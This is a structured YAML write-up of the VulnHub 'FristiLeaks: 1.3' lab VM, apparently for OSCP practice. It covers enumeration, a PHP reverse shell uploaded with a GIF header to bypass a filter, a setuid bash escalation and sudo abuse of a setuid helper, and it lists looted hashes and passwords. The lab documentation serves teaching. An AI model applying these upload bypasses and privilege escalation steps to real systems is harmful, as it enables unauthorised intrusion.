@@ -1,0 +1,225 @@
+writeup:
+  metadata:
+    status: public
+    datetime: 20190911
+    infra: VulnHub
+    name: 'FristiLeaks: 1.3'
+    points: 30
+    path: vulnhub.fristileaks1dot3
+    url: https://www.vulnhub.com/entry/fristileaks-13,133/
+    references:
+      - https://highon.coffee/blog/fristileaks-walkthrough/
+      - https://kongwenbin.wordpress.com/2017/12/31/write-up-for-fristileaks-v1-3-vulnhub/
+    categories:
+      - oscp
+      - vulnhub
+      - linux
+    tags:
+      - exploit_php_fileupload
+      - exploit_php_fileupload_bypass
+      - privesc_sudo
+      - privesc_setuid
+  overview:
+    description: |
+      This is a writeup for VulnHub VM [`FristiLeaks: 1.3`](https://www.vulnhub.com/entry/fristileaks-13,133/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
+    killchain:
+      - "_ [VulnHub] FristiLeaks: 1.3/192.168.92.133":
+        - ". Phase #1: Enumeration":
+          - ". 80/tcp":
+            - ". http://192.168.92.133/robots.txt":
+              - ". http://192.168.92.133/cola":
+                - ". rabbithole":
+              - ". http://192.168.92.133/sisi":
+                - ". rabbithole":
+              - ". http://192.168.92.133/beer":
+                - ". rabbithole":
+              - ". http://192.168.92.133/fristi":
+                - ". #fristileaks admin portal":
+                  - ".. Phase #2: Exploitation":
+                    - ".. credentials from html source → eezeepz/keKkeKKeKKeKkEkkEk":
+                      - ".. upload php file with gif header and extension":
+                        - ".. netcat listener → php reverse shell → apache":
+                          - "... Phase #3: Privilege Escalation":
+                            - "... /var/www/notes.txt":
+                              - "... /home/eezeepz/notes.txt":
+                                - "... /tmp/runthis":
+                                  - "... /bin/bash → admin":
+                                    - "... /home/admin/cryptpass.py":
+                                      - "... su - fristigod":
+                                        - "... /home/fristigod/.secret_admin_stuff/doCom":
+                                          - "... /bin/bash → root":
+                                            - "... /root/fristileaks_secrets":
+    ttps:
+      "80/tcp/http/Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)": exploit_php_fileupload exploit_php_fileupload_bypass privesc_sudo privesc_setuid
+
+  enumeration:
+    steps:
+      - description: |
+          Here's the Nmap scan result:
+        command: |
+          # Nmap 7.70 scan initiated Wed Sep 11 13:59:40 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/vulnhub/fristileaks1.3/results/192.168.92.133/scans/_quick_tcp_nmap.txt -oX /root/toolbox/vulnhub/fristileaks1.3/results/192.168.92.133/scans/xml/_quick_tcp_nmap.xml 192.168.92.133
+          Nmap scan report for 192.168.92.133
+          Host is up, received arp-response (0.00099s latency).
+          Scanned at 2019-09-11 13:59:41 PDT for 13s
+          Not shown: 999 filtered ports
+          Reason: 992 no-responses and 7 host-prohibiteds
+          PORT   STATE SERVICE REASON         VERSION
+          80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+          | http-methods:
+          |   Supported Methods: GET HEAD POST OPTIONS TRACE
+          |_  Potentially risky methods: TRACE
+          | http-robots.txt: 3 disallowed entries
+          |_/cola /sisi /beer
+          |_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+          |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+          MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+
+          Read data files from: /usr/bin/../share/nmap
+          Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+          # Nmap done at Wed Sep 11 13:59:54 2019 -- 1 IP address (1 host up) scanned in 14.00 seconds
+      - description: |
+          We find references to 3 directories from `robots.txt`:
+        command: |
+          http://192.168.92.133/cola
+          http://192.168.92.133/sisi
+          http://192.168.92.133/beer
+        screenshot:
+          - ./screenshot01.png
+      - description: |
+          These directories don't have anything useful other than a meme image. Since all these directory names are references to drinks and the name of this VM also referes to one, we try `http://192.168.92.133/fristi` and are presented with a login page:
+        screenshot:
+          - ./screenshot02.png
+    findings:
+      openports:
+        - '80/tcp  |  http  |  Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)'
+      files:
+        - http://192.168.92.133/robots.txt
+        - http://192.168.92.133/fristi
+      users:
+        ssh:
+          - eezeepz
+          - admin
+          - fristigod
+  exploitation:
+    steps:
+      - description: |
+          The source of this page hints at a possible username `eezeepz` and password encoded within an image embedded as Base64 data in this source:
+        command: |
+          eezeepz/keKkeKKeKKeKkEkkEk
+        screenshot:
+          - ./screenshot02a.png
+          - ./screenshot02b.png
+      - description: |
+          We login using these credentials and are presented with a file upload page. We create a PHP reverse shell, add `GIF89a` magic byte to it start and rename it as `rs.php.gif` to evade filters and upload the file. Once uploaded the applications informs us of the upload directory as well:
+        command: |
+          rs.php.gif → http://192.168.92.133/fristi/uploads/rs.php.gif
+        screenshot:
+          - ./screenshot03.png
+      - description: |
+          We start a Netcat listener, issue a request for this file using `curl` and are presented with the initial shell:
+        command: |
+          nc -nlvp 443
+          curl -v "http://192.168.92.133/fristi/uploads/rs.php.gif"
+        screenshot:
+          - ./screenshot04.png
+          - ./screenshot05.png
+  postexploit:
+    user: apache
+    hostname: localhost.localdomain
+    id: |
+      uid=48(apache) gid=48(apache) groups=48(apache)
+    uname: |
+      Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+    ifconfig: |
+      eth0  Link encap:Ethernet  HWaddr 08:00:27:A5:A6:76
+            inet addr:192.168.92.133  Bcast:192.168.92.255  Mask:255.255.255.0
+            inet6 addr: fe80::a00:27ff:fea5:a676/64 Scope:Link
+            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+            RX packets:343696 errors:0 dropped:0 overruns:0 frame:0
+            TX packets:199868 errors:0 dropped:0 overruns:0 carrier:0
+            collisions:0 txqueuelen:1000
+            RX bytes:28339698 (27.0 MiB)  TX bytes:30059387 (28.6 MiB)
+    users:
+      - eezeepz
+      - admin
+      - fristigod
+  privesc:
+    steps:
+      - description: |
+          Exploring the filesystem, we come across `/var/www/notex.txt` file. This file hints looking at the contents of user `eezeepz`'s home directory:
+        command: |
+          cd /var/www
+          cat notes.txt
+        screenshot:
+          - ./screenshot06.png
+      - description: |
+          We find another interesting file at `/home/eezeepz/notes.txt` which hints at a possible privesc method:
+        command: |
+          cd /home/eezeepz
+          cat notes.txt
+        screenshot:
+          - ./screenshot07.png
+      - description: |
+          As suggested in the notes file, we create a file `/tmp/runthis` to execute a command starting with `/usr/bin` followed by directory traversal strings to copy the `bash` shell into `/tmp` directory and setuid on it. Since these commadns are executed within the scope of user `admin`, wehn we run the `/tmp/bash` file, we get a shell as user `admin`:
+        command: |
+          echo -e "/usr/bin/../../bin/cp /bin/bash /tmp/bash; chmod u+s /tmp/bash" >/tmp/runthis
+          /tmp/bash -p
+        screenshot:
+          - ./screenshot07a.png
+      - description: |
+          We move into `/home/admin` directory and find a reversed, Base64 encoded string within `whoisyourgodnow.txt` file, that is owned by user `fristigod`. We also find a Python script `cryptpass.py` in this directory. Looking at the script, we reverse the encoding process and add a decoding method to it. Testing updated script with `=RFn0AKnlMHMPIzpyuTI0ITG` reveals the password for user `fristigod` to be `LetThereBeFristi!`. We the use `su` to switch user:
+        command: |
+          cat whoisyourgodnow.txt
+          cat cryptpass.py
+          python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
+          su - fristigod
+        screenshot:
+          - ./screenshot07b.png
+          - ./screenshot07c.png
+      - description: |
+          Looking at the file `cryptedpass.txt`, which is owned by user `admin`, we see a similar encoded string as before and repeat the process to get decoded the decoded password `thisisalsopw123`. We use this to switch user:
+        command: |
+          cat cryptedpass.txt
+          cat cryptpass.py
+          python cryptpass.py mVGZ3O3omkJLmy2pcuTq
+          su - admin
+        screenshot:
+          - ./screenshot07d.png
+          - ./screenshot07e.png
+      - description: |
+          We return to being user `fristigod` and explore their home directory. Within the `./bash_history` file we find references to a local, setuid file `.secret_admin_stuff/doCom`:
+        command: |
+          cd /home/fristigod
+          cat .bash_history
+        screenshot:
+          - ./screenshot07f.png
+          - ./screenshot07g.png
+      - description: |
+          Using examples from `.bash_history`, we run the setuid file to execute `/bin/bash` and gain elevated privileges:
+        command: |
+          sudo -u fristi ./doCom "/bin/bash"
+        screenshot:
+          - ./screenshot08.png
+      - description: |
+          We then explore `root`'s home directory and find the flag within `/root/fristileaks_secrets.txt` file:
+        command: |
+          cd /root
+          cat fristileaks_secrets
+        screenshot:
+          - ./screenshot09.png
+  loot:
+    hashes:
+      - 'root:$6$qAoeosiW$fsOy8H/VKux.9K0T3Ww2D3FPNlO5LAaFytx/6t69Q7LPDSS/nNiP4xzq0Qab.Iz3uy5fYdH3Aw/K5v3ZMhRRH0:16756:0:99999:7:::'
+      - 'eezeepz:$6$djF4bN.s$JWhT7wJo37fgtuJ.be2Q62PnM/AogXuqGa.PgRzrMGv9/Th0aixBXl8Usy9.RkO1ZRAQ/UM3xP7oGWu9zgEIl.:16756:0:99999:7:::'
+      - 'admin:$6$NPXhvENr$yG4a5RpaLpL5UDRRZ3Ts0eZadZfFFbYpI1kyNJp9rND0AySx2FhYSmAvY.91UzETJVvZcDjWb2pp85uLAli2J/:16757:0:99999:7:::'
+      - 'fristigod:$6$0WqnZlI/$gIzMByP7rH21W3neA.uHYZZg5aM7gI1xtOj8WwgoK1QgQh2LWL0nQBJau/mGcOSxLbaGJhJjM.6HNJTWsaetf0:16758:0:99999:7:::'
+    credentials:
+      ssh:
+        - admin/thisisalsopw123
+        - fristigod/LetThereBeFristi!
+      http:
+        - eezeepz/keKkeKKeKKeKkEkkEk
+    flags:
+      - Y0u_kn0w_y0u_l0ve_fr1st1
+  learning:
+    -
